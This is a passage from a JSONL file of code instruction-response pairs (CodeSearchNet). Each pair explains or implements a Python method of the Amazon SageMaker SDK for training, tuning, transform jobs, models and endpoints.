vpc_config\n\n        if enable_network_isolation:\n            train_request['EnableNetworkIsolation'] = enable_network_isolation\n\n        if encrypt_inter_container_traffic:\n            train_request['EnableInterContainerTrafficEncryption'] = \\\n                encrypt_inter_container_traffic\n\n        LOGGER.info('Creating training-job with name: {}'.format(job_name))\n        LOGGER.debug('train request: {}'.format(json.dumps(train_request, indent=4)))\n        self.sagemaker_client.create_training_job(**train_request)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef compile_model(self, input_model_config, output_model_config, role,\n                      job_name, stop_condition, tags):\n        \"\"\"Create an Amazon SageMaker Neo compilation job.\n\n        Args:\n            input_model_config (dict): the trained model and the Amazon S3 location where it is stored.\n            output_model_config (dict): Identifies the Amazon S3 location where you want Amazon SageMaker Neo to save\n                the results of compilation job\n            role (str): An AWS IAM role (either name or full ARN). The Amazon SageMaker Neo compilation jobs use this\n                role to access model artifacts. You must grant sufficient permissions to this role.\n            job_name (str): Name of the compilation job being created.\n            stop_condition (dict): Defines when compilation job shall finish. Contains entries that can be understood\n                by the service like ``MaxRuntimeInSeconds``.\n            tags (list[dict]): List of tags for labeling a compile model job. For more, see\n                https://docs.aws.amazon.com/sagemaker/latest/dg/API_Tag.html.\n\n        Returns:\n            str: ARN of the compile model job, if it is created.\n        \"\"\"\n\n        compilation_job_request = {\n            'InputConfig': input_model_config,\n            'OutputConfig': output_model_config,\n            'RoleArn': role,\n            'StoppingCondition': stop_condition,\n            'CompilationJobName': job_name\n        }\n\n        if tags is not None:\n            compilation_job_request['Tags'] = tags\n\n        LOGGER.info('Creating compilation-job with name: {}'.format(job_name))\n        self.sagemaker_client.create_compilation_job(**compilation_job_request)", "response": "Create an Amazon SageMaker Neo compilation job."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ncreates an Amazon SageMaker hyperparameter tuning job Args: job_name (str): Name of the tuning job being created. strategy (str): Strategy to be used for hyperparameter estimations. objective_type (str): The type of the objective metric for evaluating training jobs. This value can be either 'Minimize' or 'Maximize'. objective_metric_name (str): Name of the metric for evaluating training jobs. max_jobs (int): Maximum total number of training jobs to start for the hyperparameter tuning job. max_parallel_jobs (int): Maximum number of parallel training jobs to start. parameter_ranges (dict): Dictionary of parameter ranges. These parameter ranges can be one of three types: Continuous, Integer, or Categorical. static_hyperparameters (dict): Hyperparameters for model training. These hyperparameters remain unchanged across all of the training jobs for the hyperparameter tuning job. The hyperparameters are made accessible as a dictionary for the training code on SageMaker. image (str): Docker image containing training code. input_mode (str): The input mode that the algorithm supports. Valid modes: * 'File' - Amazon SageMaker copies the training dataset from the S3 location to a directory in the Docker container. * 'Pipe' - Amazon SageMaker streams data directly from S3 to the container via a Unix-named pipe. metric_definitions (list[dict]): A list of dictionaries that defines the metric(s) used to evaluate the training jobs. Each dictionary contains two keys: 'Name' for the name of the metric, and 'Regex' for the regular expression used to extract the metric from the logs. This should be defined only for jobs that don't use an Amazon algorithm. role (str): An AWS IAM role (either name or full ARN). The Amazon SageMaker training jobs and APIs that create Amazon SageMaker endpoints use this role to access training data and model artifacts. You must grant sufficient permissions to this role. input_config (list): A list of Channel objects. Each channel is a named input source. Please refer to the format details described: https://botocore.readthedocs.io/en/latest/reference/services/sagemaker.html#SageMaker.Client.create_training_job output_config (dict): The S3 URI where you want to store the training results and optional KMS key ID. resource_config (dict): Contains values for ResourceConfig: * instance_count (int): Number of EC2 instances to use for training. The key in resource_config is 'InstanceCount'. * instance_type (str): Type of EC2 instance to use for training, for example, 'ml.c4.xlarge'. The key in resource_config is 'InstanceType'. stop_condition (dict): When training should finish, e.g. ``MaxRuntimeInSeconds``. tags (list[dict]): List of tags for labeling the tuning job. For more, see https://docs.aws.amazon.com/sagemaker/latest/dg/API_Tag.html. warm_start_config (dict): Configuration defining the type of warm start and other required configurations. early_stopping_type (str): Specifies whether early stopping is enabled for the job. Can be either 'Auto' or 'Off'. If set to 'Off', early stopping will not be attempted. If set to 'Auto', early stopping of some training jobs may happen, but is not guaranteed to. encrypt_inter_container_traffic (bool): Specifies whether traffic between training containers is encrypted for the training jobs started for this hyperparameter tuning job (default: ``False``). vpc_config (dict): Contains values for VpcConfig (default: None): * subnets (list[str]): List of subnet ids. The key in vpc_config is 'Subnets'. * security_group_ids (list[str]): List of security group ids. The key in vpc_config is 'SecurityGroupIds'.", "response": "def tune(self, job_name, strategy, objective_type, objective_metric_name,\n             max_jobs, max_parallel_jobs, parameter_ranges,\n             static_hyperparameters, input_mode, metric_definitions,\n             role, input_config, output_config, resource_config, stop_condition, tags,\n             warm_start_config, enable_network_isolation=False, image=None, algorithm_arn=None,\n             early_stopping_type='Off', encrypt_inter_container_traffic=False, vpc_config=None):\n        \"\"\"Create an Amazon SageMaker hyperparameter tuning job\n\n        Args:\n            job_name (str): Name of the tuning job being created.\n            strategy (str): Strategy to be used for hyperparameter estimations.\n            objective_type (str): The type of the objective metric for evaluating training jobs. This value can be\n                either 'Minimize' or 'Maximize'.\n            objective_metric_name (str): Name of the metric for evaluating training jobs.\n            max_jobs (int): Maximum total number of training jobs to start for the hyperparameter tuning job.\n            max_parallel_jobs (int): Maximum number of parallel training jobs to start.\n            parameter_ranges (dict): Dictionary of parameter ranges. These parameter ranges can be one of three types:\n                 Continuous, Integer, or Categorical.\n            static_hyperparameters (dict): Hyperparameters for model training. These hyperparameters remain\n                unchanged across all of the training jobs for the hyperparameter tuning job. The hyperparameters are\n                made accessible as a dictionary for the training code on SageMaker.\n            image (str): Docker image containing training code.\n            input_mode (str): The input mode that the algorithm supports. Valid modes:\n\n                * 'File' - Amazon SageMaker copies the training dataset from the S3 location to\n                    a directory in the Docker container.\n                * 'Pipe' - Amazon SageMaker streams data directly from S3 to the container via a Unix-named pipe.\n\n            metric_definitions (list[dict]): A list of dictionaries that defines the metric(s) used to evaluate the\n                training jobs. Each dictionary contains two keys: 'Name' for the name of the metric, and 'Regex' for\n                the regular expression used to extract the metric from the logs. This should be defined only for\n                jobs that don't use an Amazon algorithm.\n            role (str): An AWS IAM role (either name or full ARN). The Amazon SageMaker training jobs and APIs\n                that create Amazon SageMaker endpoints use this role to access training data and model artifacts.\n                You must grant sufficient permissions to this role.\n            input_config (list): A list of Channel objects. Each channel is a named input source. Please refer to\n                 the format details described:\n                 https://botocore.readthedocs.io/en/latest/reference/services/sagemaker.html#SageMaker.Client.create_training_job\n            output_config (dict): The S3 URI where you want to store the training results and optional KMS key ID.\n            resource_config (dict): Contains values for ResourceConfig:\n\n                * instance_count (int): Number of EC2 instances to use for training.\n                    The key in resource_config is 'InstanceCount'.\n                * instance_type (str): Type of EC2 instance to use for training, for example, 'ml.c4.xlarge'.\n                    The key in resource_config is 'InstanceType'.\n\n            stop_condition (dict): When training should finish, e.g. ``MaxRuntimeInSeconds``.\n            tags (list[dict]): List of tags for labeling the tuning job. For more, see\n                https://docs.aws.amazon.com/sagemaker/latest/dg/API_Tag.html.\n            warm_start_config (dict): Configuration defining the type of warm start and\n                other required configurations.\n            early_stopping_type (str): Specifies whether early stopping is enabled for the job.\n                Can be either 'Auto' or 'Off'. If set to 'Off', early stopping will not be attempted.\n                If set to 'Auto', early stopping of some training jobs may happen, but is not guaranteed to.\n            encrypt_inter_container_traffic (bool): Specifies whether traffic between training containers\n                is encrypted for the training jobs started for this hyperparameter tuning job (default: ``False``).\n            vpc_config (dict): Contains values for VpcConfig (default: None):\n\n                * subnets (list[str]): List of subnet ids.\n                    The key in vpc_config is 'Subnets'.\n                * security_group_ids (list[str]): List of security group ids.\n                    The key in vpc_config is 'SecurityGroupIds'.\n\n        \"\"\"\n        tune_request = {\n            'HyperParameterTuningJobName': job_name,\n            'HyperParameterTuningJobConfig': {\n                'Strategy': strategy,\n                'HyperParameterTuningJobObjective': {\n                    'Type': objective_type,\n                    'MetricName': objective_metric_name,\n                },\n                'ResourceLimits': {\n                    'MaxNumberOfTrainingJobs': max_jobs,\n                    'MaxParallelTrainingJobs': max_parallel_jobs,\n                },\n                'ParameterRanges': parameter_ranges,\n                'TrainingJobEarlyStoppingType': early_stopping_type,\n            },\n            'TrainingJobDefinition': {\n                'StaticHyperParameters': static_hyperparameters,\n                'RoleArn': role,\n                'OutputDataConfig': output_config,\n                'ResourceConfig': resource_config,\n                'StoppingCondition': stop_condition,\n            }\n        }\n\n        algorithm_spec = {\n            'TrainingInputMode': input_mode\n        }\n        if algorithm_arn:\n            algorithm_spec['AlgorithmName'] = algorithm_arn\n        else:\n            algorithm_spec['TrainingImage'] = image\n\n        tune_request['TrainingJobDefinition']['AlgorithmSpecification'] = algorithm_spec\n\n        if input_config is not None:\n            tune_request['TrainingJobDefinition']['InputDataConfig'] = input_config\n\n        if warm_start_config:\n            tune_request['WarmStartConfig'] = warm_start_config\n\n        if metric_definitions is not None:\n            tune_request['TrainingJobDefinition']['AlgorithmSpecification']['MetricDefinitions'] = metric_definitions\n\n        if tags is not None:\n            tune_request['Tags'] = tags\n\n        if vpc_config is not None:\n            tune_request['TrainingJobDefinition']['VpcConfig'] = vpc_config\n\n        if enable_network_isolation:\n            tune_request['TrainingJobDefinition']['EnableNetworkIsolation'] = True\n\n        if encrypt_inter_container_traffic:\n            tune_request['TrainingJobDefinition']['EnableInterContainerTrafficEncryption'] = True\n\n        LOGGER.info('Creating hyperparameter tuning job with name: {}'.format(job_name))\n        LOGGER.debug('tune request: {}'.format(json.dumps(tune_request, indent=4)))\n        self.sagemaker_client.create_hyper_parameter_tuning_job(**tune_request)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef stop_tuning_job(self, name):\n        try:\n            LOGGER.info('Stopping tuning job: {}'.format(name))\n            self.sagemaker_client.stop_hyper_parameter_tuning_job(HyperParameterTuningJobName=name)\n        except ClientError as e:\n            error_code = e.response['Error']['Code']\n            # allow to pass if the job already stopped\n            if error_code == 'ValidationException':\n                LOGGER.info('Tuning job: {} is already stopped or not running.'.format(name))\n            else:\n                LOGGER.error('Error occurred while attempting to stop tuning job: {}. Please try again.'.format(name))\n                raise", "response": "Stop the Amazon SageMaker hyperparameter tuning job with the specified name."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncreating an Amazon SageMaker transform job.", "response": "def transform(self, job_name, model_name, strategy, max_concurrent_transforms, max_payload, env,\n                  input_config, output_config, resource_config, tags):\n        \"\"\"Create an Amazon SageMaker transform job.\n\n        Args:\n            job_name (str): Name of the transform job being created.\n            model_name (str): Name of the SageMaker model being used for the transform job.\n            strategy (str): The strategy used to decide how to batch records in a single request.\n                Possible values are 'MULTI_RECORD' and 'SINGLE_RECORD'.\n            max_concurrent_transforms (int): The maximum number of HTTP requests to be made to\n                each individual transform container at one time.\n            max_payload (int): Maximum size of the payload in a single HTTP request to the container in MB.\n            env (dict): Environment variables to be set for use during the transform job.\n            input_config (dict): A dictionary describing the input data (and its location) for the job.\n            output_config (dict): A dictionary describing the output location for the job.\n            resource_config (dict): A dictionary describing the resources to complete the job.\n            tags (list[dict]): List of tags for labeling a training job. For more, see\n                https://docs.aws.amazon.com/sagemaker/latest/dg/API_Tag.html.\n        \"\"\"\n        transform_request = {\n            'TransformJobName': job_name,\n            'ModelName': model_name,\n            'TransformInput': input_config,\n            'TransformOutput': output_config,\n            'TransformResources': resource_config,\n        }\n\n        if strategy is not None:\n            transform_request['BatchStrategy'] = strategy\n\n        if max_concurrent_transforms is not None:\n            transform_request['MaxConcurrentTransforms'] = max_concurrent_transforms\n\n        if max_payload is not None:\n            transform_request['MaxPayloadInMB'] = max_payload\n\n        if env is not None:\n            transform_request['Environment'] = env\n\n        if tags is not None:\n            transform_request['Tags'] = tags\n\n        LOGGER.info('Creating transform job with name: {}'.format(job_name))\n        LOGGER.debug('Transform request: {}'.format(json.dumps(transform_request, indent=4)))\n        self.sagemaker_client.create_transform_job(**transform_request)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ncreates an Amazon SageMaker Model.", "response": "def create_model(self, name, role, container_defs, vpc_config=None,\n                     enable_network_isolation=False, primary_container=None,\n                     tags=None):\n        \"\"\"Create an Amazon SageMaker ``Model``.\n        Specify the S3 location of the model artifacts and Docker image containing\n        the inference code. Amazon SageMaker uses this information to deploy the\n        model in Amazon SageMaker. This method can also be used to create a Model for an Inference Pipeline\n        if you pass the list of container definitions through the containers parameter.\n\n        Args:\n            name (str): Name of the Amazon SageMaker ``Model`` to create.\n            role (str): An AWS IAM role (either name or full ARN). The Amazon SageMaker training jobs and APIs\n                that create Amazon SageMaker endpoints use this role to access training data and model artifacts.\n                You must grant sufficient permissions to this role.\n            container_defs (list[dict[str, str]] or [dict[str, str]]): A single container definition or a list of\n                container definitions which will be invoked sequentially while performing the prediction. If the list\n                contains only one container, then it'll be passed to SageMaker Hosting as the ``PrimaryContainer`` and\n                otherwise, it'll be passed as ``Containers``.You can also specify the  return value of\n                ``sagemaker.get_container_def()`` or ``sagemaker.pipeline_container_def()``, which will used to\n                create more advanced container configurations ,including model containers which need artifacts from S3.\n            vpc_config (dict[str, list[str]]): The VpcConfig set on the model (default: None)\n                * 'Subnets' (list[str]): List of subnet ids.\n                * 'SecurityGroupIds' (list[str]): List of security group ids.\n            enable_network_isolation (bool): Wether the model requires network isolation or not.\n            primary_container (str or dict[str, str]): Docker image which defines the inference code.\n                You can also specify the return value of ``sagemaker.container_def()``, which is used to create\n                more advanced container configurations, including model containers which need artifacts from S3. This\n                field is deprecated, please use container_defs instead.\n            tags(List[dict[str, str]]): Optional. The list of tags to add to the model. Example:\n                    >>> tags = [{'Key': 'tagname', 'Value': 'tagvalue'}]\n                    For more information about tags, see https://boto3.amazonaws.com/v1/documentation\\\n                    /api/latest/reference/services/sagemaker.html#SageMaker.Client.add_tags\n\n\n        Returns:\n            str: Name of the Amazon SageMaker ``Model`` created.\n        \"\"\"\n        if container_defs and primary_container:\n            raise ValueError('Both container_defs and primary_container can not be passed as input')\n\n        if primary_container:\n            msg = 'primary_container is going to be deprecated in a future release. Please use container_defs instead.'\n            warnings.warn(msg, DeprecationWarning)\n            container_defs = primary_container\n\n        role = self.expand_role(role)\n\n        if isinstance(container_defs, list):\n            container_definition = container_defs\n        else:\n            container_definition = _expand_container_def(container_defs)\n\n        create_model_request = _create_model_request(name=name,\n                                                     role=role,\n                                                     container_def=container_definition,\n                                                     tags=tags)\n\n        if vpc_config:\n            create_model_request['VpcConfig'] = vpc_config\n\n        if enable_network_isolation:\n            create_model_request['EnableNetworkIsolation'] = True\n\n        LOGGER.info('Creating model with name: {}'.format(name))\n        LOGGER.debug('CreateModel request: {}'.format(json.dumps(create_model_request, indent=4)))\n\n        try:\n            self.sagemaker_client.create_model(**create_model_request)\n        except ClientError as e:\n            error_code = e.response['Error']['Code']\n            message = e.response['Error']['Message']\n\n            if error_code == 'ValidationException' and 'Cannot create already existing model' in message:\n                LOGGER.warning('Using already existing model: {}'.format(name))\n            else:\n                raise\n\n        return name"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ncreate an Amazon SageMaker Model from a SageMaker Training Job.", "response": "def create_model_from_job(self, training_job_name, name=None, role=None, primary_container_image=None,\n                              model_data_url=None, env=None, vpc_config_override=vpc_utils.VPC_CONFIG_DEFAULT):\n        \"\"\"Create an Amazon SageMaker ``Model`` from a SageMaker Training Job.\n\n        Args:\n            training_job_name (str): The Amazon SageMaker Training Job name.\n            name (str): The name of the SageMaker ``Model`` to create (default: None).\n                If not specified, the training job name is used.\n            role (str): The ``ExecutionRoleArn`` IAM Role ARN for the ``Model``, specified either by an IAM role name or\n                role ARN. If None, the ``RoleArn`` from the SageMaker Training Job will be used.\n            primary_container_image (str): The Docker image reference (default: None). If None, it defaults to\n                the Training Image in ``training_job_name``.\n            model_data_url (str): S3 location of the model data (default: None). If None, defaults to\n                the ``ModelS3Artifacts`` of ``training_job_name``.\n            env (dict[string,string]): Model environment variables (default: {}).\n            vpc_config_override (dict[str, list[str]]): Optional override for VpcConfig set on the model.\n                Default: use VpcConfig from training job.\n                * 'Subnets' (list[str]): List of subnet ids.\n                * 'SecurityGroupIds' (list[str]): List of security group ids.\n\n        Returns:\n            str: The name of the created ``Model``.\n        \"\"\"\n        training_job = self.sagemaker_client.describe_training_job(TrainingJobName=training_job_name)\n        name = name or training_job_name\n        role = role or training_job['RoleArn']\n        env = env or {}\n        primary_container = container_def(\n            primary_container_image or training_job['AlgorithmSpecification']['TrainingImage'],\n            model_data_url=model_data_url or training_job['ModelArtifacts']['S3ModelArtifacts'],\n            env=env)\n        vpc_config = _vpc_config_from_training_job(training_job, vpc_config_override)\n        return self.create_model(name, role, primary_container, vpc_config=vpc_config)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ncreates a SageMaker Model Package from the results of training with an Algorithm Package", "response": "def create_model_package_from_algorithm(self, name, description, algorithm_arn, model_data):\n        \"\"\"Create a SageMaker Model Package from the results of training with an Algorithm Package\n\n        Args:\n            name (str): ModelPackage name\n            description (str): Model Package description\n            algorithm_arn (str): arn or name of the algorithm used for training.\n            model_data (str): s3 URI to the model artifacts produced by training\n        \"\"\"\n        request = {\n            'ModelPackageName': name,\n            'ModelPackageDescription': description,\n            'SourceAlgorithmSpecification': {\n                'SourceAlgorithms': [\n                    {\n                        'AlgorithmName': algorithm_arn,\n                        'ModelDataUrl': model_data\n                    }\n                ]\n            }\n        }\n        try:\n            LOGGER.info('Creating model package with name: {}'.format(name))\n            self.sagemaker_client.create_model_package(**request)\n        except ClientError as e:\n            error_code = e.response['Error']['Code']\n            message = e.response['Error']['Message']\n\n            if (\n                    error_code == 'ValidationException'\n                    and 'ModelPackage already exists' in message\n            ):\n                LOGGER.warning('Using already existing model package: {}'.format(name))\n            else:\n                raise"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nwaiting for an Amazon SageMaker model package to complete.", "response": "def wait_for_model_package(self, model_package_name, poll=5):\n        \"\"\"Wait for an Amazon SageMaker endpoint deployment to complete.\n\n        Args:\n            endpoint (str): Name of the ``Endpoint`` to wait for.\n            poll (int): Polling interval in seconds (default: 5).\n\n        Returns:\n            dict: Return value from the ``DescribeEndpoint`` API.\n        \"\"\"\n        desc = _wait_until(lambda: _create_model_package_status(self.sagemaker_client, model_package_name),\n                           poll)\n        status = desc['ModelPackageStatus']\n\n        if status != 'Completed':\n            reason = desc.get('FailureReason', None)\n            raise ValueError('Error creating model package {}: {} Reason: {}'.format(\n                model_package_name, status, reason))\n        return desc"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef create_endpoint_config(self, name, model_name, initial_instance_count, instance_type,\n                               accelerator_type=None, tags=None, kms_key=None):\n        \"\"\"Create an Amazon SageMaker endpoint configuration.\n\n        The endpoint configuration identifies the Amazon SageMaker model (created using the\n        ``CreateModel`` API) and the hardware configuration on which to deploy the model. Provide this\n        endpoint configuration to the ``CreateEndpoint`` API, which then launches the hardware and deploys the model.\n\n        Args:\n            name (str): Name of the Amazon SageMaker endpoint configuration to create.\n            model_name (str): Name of the Amazon SageMaker ``Model``.\n            initial_instance_count (int): Minimum number of EC2 instances to launch. The actual number of\n                active instances for an endpoint at any given time varies due to autoscaling.\n            instance_type (str): Type of EC2 instance to launch, for example, 'ml.c4.xlarge'.\n            accelerator_type (str): Type of Elastic Inference accelerator to attach to the instance. For example,\n                'ml.eia1.medium'. For more information: https://docs.aws.amazon.com/sagemaker/latest/dg/ei.html\n            tags(List[dict[str, str]]): Optional. The list of tags to add to the endpoint config. Example:\n                    >>> tags = [{'Key': 'tagname', 'Value': 'tagvalue'}]\n                    For more information about tags, see https://boto3.amazonaws.com/v1/documentation\\\n                    /api/latest/reference/services/sagemaker.html#SageMaker.Client.add_tags\n\n\n        Returns:\n            str: Name of the endpoint point configuration created.\n        \"\"\"\n        LOGGER.info('Creating endpoint-config with name {}'.format(name))\n\n        tags = tags or []\n\n        request = {\n            'EndpointConfigName': name,\n            'ProductionVariants': [\n                production_variant(model_name, instance_type, initial_instance_count,\n                                   accelerator_type=accelerator_type)\n            ],\n        }\n\n        if tags is not None:\n            request['Tags'] = tags\n\n        if kms_key is not None:\n            request['KmsKeyId'] = kms_key\n\n        self.sagemaker_client.create_endpoint_config(**request)\n        return name", "response": "Create an Amazon SageMaker endpoint - point configuration."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ncreates an Amazon SageMaker Endpoint according to the endpoint configuration specified in the request.", "response": "def create_endpoint(self, endpoint_name, config_name, tags=None, wait=True):\n        \"\"\"Create an Amazon SageMaker ``Endpoint`` according to the endpoint configuration specified in the request.\n\n        Once the ``Endpoint`` is created, client applications can send requests to obtain inferences.\n        The endpoint configuration is created using the ``CreateEndpointConfig`` API.\n\n        Args:\n            endpoint_name (str): Name of the Amazon SageMaker ``Endpoint`` being created.\n            config_name (str): Name of the Amazon SageMaker endpoint configuration to deploy.\n            wait (bool): Whether to wait for the endpoint deployment to complete before returning (default: True).\n\n        Returns:\n            str: Name of the Amazon SageMaker ``Endpoint`` created.\n        \"\"\"\n        LOGGER.info('Creating endpoint with name {}'.format(endpoint_name))\n\n        tags = tags or []\n\n        self.sagemaker_client.create_endpoint(EndpointName=endpoint_name, EndpointConfigName=config_name, Tags=tags)\n        if wait:\n            self.wait_for_endpoint(endpoint_name)\n        return endpoint_name"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef update_endpoint(self, endpoint_name, endpoint_config_name):\n        if not _deployment_entity_exists(lambda: self.sagemaker_client.describe_endpoint(EndpointName=endpoint_name)):\n            raise ValueError('Endpoint with name \"{}\" does not exist; please use an existing endpoint name'\n                             .format(endpoint_name))\n\n        self.sagemaker_client.update_endpoint(EndpointName=endpoint_name,\n                                              EndpointConfigName=endpoint_config_name)\n        return endpoint_name", "response": "Update an Amazon SageMaker endpoint according to the endpoint configuration specified in the request."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ndeletes an Amazon SageMaker Endpoint.", "response": "def delete_endpoint(self, endpoint_name):\n        \"\"\"Delete an Amazon SageMaker ``Endpoint``.\n\n        Args:\n            endpoint_name (str): Name of the Amazon SageMaker ``Endpoint`` to delete.\n        \"\"\"\n        LOGGER.info('Deleting endpoint with name: {}'.format(endpoint_name))\n        self.sagemaker_client.delete_endpoint(EndpointName=endpoint_name)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ndeletes an Amazon SageMaker endpoint configuration.", "response": "def delete_endpoint_config(self, endpoint_config_name):\n        \"\"\"Delete an Amazon SageMaker endpoint configuration.\n\n        Args:\n            endpoint_config_name (str): Name of the Amazon SageMaker endpoint configuration to delete.\n        \"\"\"\n        LOGGER.info('Deleting endpoint configuration with name: {}'.format(endpoint_config_name))\n        self.sagemaker_client.delete_endpoint_config(EndpointConfigName=endpoint_config_name)"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ndeletes an Amazon SageMaker Model.", "response": "def delete_model(self, model_name):\n        \"\"\"Delete an Amazon SageMaker Model.\n\n        Args:\n            model_name (str): Name of the Amazon SageMaker model to delete.\n\n        \"\"\"\n        LOGGER.info('Deleting model with name: {}'.format(model_name))\n        self.sagemaker_client.delete_model(ModelName=model_name)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef wait_for_job(self, job, poll=5):\n        desc = _wait_until_training_done(lambda last_desc: _train_done(self.sagemaker_client, job, last_desc),\n                                         None, poll)\n        self._check_job_status(job, desc, 'TrainingJobStatus')\n        return desc", "response": "Wait for an Amazon SageMaker training job to complete."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nwaits for an Amazon SageMaker Neo compilation job to complete.", "response": "def wait_for_compilation_job(self, job, poll=5):\n        \"\"\"Wait for an Amazon SageMaker Neo compilation job to complete.\n\n        Args:\n            job (str): Name of the compilation job to wait for.\n            poll (int): Polling interval in seconds (default: 5).\n\n        Returns:\n            (dict): Return value from the ``DescribeCompilationJob`` API.\n\n        Raises:\n            ValueError: If the compilation job fails.\n        \"\"\"\n        desc = _wait_until(lambda: _compilation_job_status(self.sagemaker_client, job), poll)\n        self._check_job_status(job, desc, 'CompilationJobStatus')\n        return desc"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef wait_for_tuning_job(self, job, poll=5):\n        desc = _wait_until(lambda: _tuning_job_status(self.sagemaker_client, job), poll)\n        self._check_job_status(job, desc, 'HyperParameterTuningJobStatus')\n        return desc", "response": "Wait for an Amazon SageMaker hyperparameter tuning job to complete."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nwait for an Amazon SageMaker transform job to complete.", "response": "def wait_for_transform_job(self, job, poll=5):\n        \"\"\"Wait for an Amazon SageMaker transform job to complete.\n\n        Args:\n            job (str): Name of the transform job to wait for.\n            poll (int): Polling interval in seconds (default: 5).\n\n        Returns:\n            (dict): Return value from the ``DescribeTransformJob`` API.\n\n        Raises:\n            ValueError: If the transform job fails.\n        \"\"\"\n        desc = _wait_until(lambda: _transform_job_status(self.sagemaker_client, job), poll)\n        self._check_job_status(job, desc, 'TransformJobStatus')\n        return desc"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _check_job_status(self, job, desc, status_key_name):\n        status = desc[status_key_name]\n        # If the status is capital case, then convert it to Camel case\n        status = _STATUS_CODE_TABLE.get(status, status)\n\n        if status != 'Completed' and status != 'Stopped':\n            reason = desc.get('FailureReason', '(No reason provided)')\n            job_type = status_key_name.replace('JobStatus', ' job')\n            raise ValueError('Error for {} {}: {} Reason: {}'.format(job_type, job, status, reason))", "response": "Check to see if the job completed successfully and if not construct and\n            class instance."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nwaiting for an Amazon SageMaker endpoint deployment to complete.", "response": "def wait_for_endpoint(self, endpoint, poll=5):\n        \"\"\"Wait for an Amazon SageMaker endpoint deployment to complete.\n\n        Args:\n            endpoint (str): Name of the ``Endpoint`` to wait for.\n            poll (int): Polling interval in seconds (default: 5).\n\n        Returns:\n            dict: Return value from the ``DescribeEndpoint`` API.\n        \"\"\"\n        desc = _wait_until(lambda: _deploy_done(self.sagemaker_client, endpoint), poll)\n        status = desc['EndpointStatus']\n\n        if status != 'InService':\n            reason = desc.get('FailureReason', None)\n            raise ValueError('Error hosting endpoint {}: {} Reason: {}'.format(endpoint, status, reason))\n        return desc"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncreate an endpoint from the results of a successful training job.", "response": "def endpoint_from_job(self, job_name, initial_instance_count, instance_type,\n                          deployment_image=None, name=None, role=None, wait=True,\n                          model_environment_vars=None, vpc_config_override=vpc_utils.VPC_CONFIG_DEFAULT,\n                          accelerator_type=None):\n        \"\"\"Create an ``Endpoint`` using the results of a successful training job.\n\n        Specify the job name, Docker image containing the inference code, and hardware configuration to deploy\n        the model. Internally the API, creates an Amazon SageMaker model (that describes the model artifacts and\n        the Docker image containing inference code), endpoint configuration (describing the hardware to deploy\n        for hosting the model), and creates an ``Endpoint`` (launches the EC2 instances and deploys the model on them).\n        In response, the API returns the endpoint name to which you can send requests for inferences.\n\n        Args:\n            job_name (str): Name of the training job to deploy the results of.\n            initial_instance_count (int): Minimum number of EC2 instances to launch. The actual number of\n                active instances for an endpoint at any given time varies due to autoscaling.\n            instance_type (str): Type of EC2 instance to deploy to an endpoint for prediction,\n                for example, 'ml.c4.xlarge'.\n            deployment_image (str): The Docker image which defines the inference code to be used as the entry point for\n                accepting prediction requests. If not specified, uses the image used for the training job.\n            name (str): Name of the ``Endpoint`` to create. If not specified, uses the training job name.\n            role (str): An AWS IAM role (either name or full ARN). The Amazon SageMaker training jobs and APIs\n                that create Amazon SageMaker endpoints use this role to access training data and model artifacts.\n                You must grant sufficient permissions to this role.\n            wait (bool): Whether to wait for the endpoint deployment to complete before returning (default: True).\n            model_environment_vars (dict[str, str]): Environment variables to set on the model container\n                (default: None).\n            vpc_config_override (dict[str, list[str]]): Overrides VpcConfig set on the model.\n                Default: use VpcConfig from training job.\n                * 'Subnets' (list[str]): List of subnet ids.\n                * 'SecurityGroupIds' (list[str]): List of security group ids.\n            accelerator_type (str): Type of Elastic Inference accelerator to attach to the instance. For example,\n                'ml.eia1.medium'. For more information: https://docs.aws.amazon.com/sagemaker/latest/dg/ei.html\n\n        Returns:\n            str: Name of the ``Endpoint`` that is created.\n        \"\"\"\n        job_desc = self.sagemaker_client.describe_training_job(TrainingJobName=job_name)\n        output_url = job_desc['ModelArtifacts']['S3ModelArtifacts']\n        deployment_image = deployment_image or job_desc['AlgorithmSpecification']['TrainingImage']\n        role = role or job_desc['RoleArn']\n        name = name or job_name\n        vpc_config_override = _vpc_config_from_training_job(job_desc, vpc_config_override)\n\n        return self.endpoint_from_model_data(model_s3_location=output_url, deployment_image=deployment_image,\n                                             initial_instance_count=initial_instance_count, instance_type=instance_type,\n                                             name=name, role=role, wait=wait,\n                                             model_environment_vars=model_environment_vars,\n                                             model_vpc_config=vpc_config_override, accelerator_type=accelerator_type)"}
